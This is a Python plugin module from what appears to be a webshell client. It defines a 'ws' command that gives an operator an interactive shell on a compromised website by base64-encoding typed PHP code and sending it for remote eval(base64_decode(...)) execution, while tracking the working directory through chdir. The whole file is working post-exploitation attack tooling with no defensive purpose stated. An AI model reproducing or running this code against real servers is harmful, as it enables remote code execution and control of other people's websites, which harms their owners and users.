from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode


@alias(func_alias="ws")
def run():
    """
    webshell

    Get a webshell of website
    """
    print(color.cyan("Eenter interactive temporary webshell...\n"))
    cwd = send(f'print(getcwd());').r_text.strip()
    while gget("loop"):
        data = input(f"[{cwd}] >>")
        lower_data = data.lower()
        if (lower_data.lower() in ['exit', 'quit', 'back']):
            break
        data = base64_encode(data)
        if (lower_data.startswith("cd ") and len(lower_data) > 3):
            path = lower_data[3:].strip()
            cwd = send(f'eval("chdir(\'{cwd}\');chdir(\'{path}\');print(getcwd());");').r_text.strip()
        else:
            req = send(f'eval("chdir(\'{cwd}\');eval(base64_decode(\'{data}\'));");')
            print("\n" + req.r_text.strip() + "\n")
    set_namespace("webshell")
